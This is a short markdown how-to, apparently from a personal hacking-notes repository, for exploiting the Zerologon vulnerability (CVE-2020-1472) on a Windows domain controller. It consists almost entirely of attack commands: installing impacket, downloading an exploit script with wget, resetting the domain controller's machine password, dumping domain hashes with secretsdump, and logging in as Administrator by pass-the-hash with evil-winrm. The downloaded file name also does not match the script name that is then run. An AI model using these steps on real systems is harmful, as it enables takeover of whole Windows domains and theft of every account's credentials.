# How to perform the Zero Logon Exploit

1. Perform these commands (in order) on attack machine:
```
python3 -m pip install virtualenv
```
```
python3 -m virtualenv impacketEnv
```
```
source impacketEnv/bin/activate
```
pip install git+https://github.com/SecureAuthCorp/impacket

2. Put zeroLogon-NullPass.py on attack machine:
```
wget https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py
```
Note: if the link above ever breaks, you can find the same code in the same directory that this code is found (https://github.com/KyserClark/Hacking-Notes/blob/main/Exploits/Zero%20Logon/zeroLogon-NullPass.py) 

3. Perform this command:
```
python3 zeroLogon-NullPass.py [DC NetBIOS Name] [MACHINE-IP]
```
Note: You can use nmap to find the NetBIOS name of the domain controller:
```
nmap -sC -sV [TARGET-IP]
```

4. Dump hashes:
```
secretsdump.py -just-dc -no-pass [DC NetBIOS Name]\$@[MACHINE-IP]
```

5. Login with account hash:
```
evil-winrm -i [TARGET-IP] -u Administrator -H [NTLM-HASH]
```
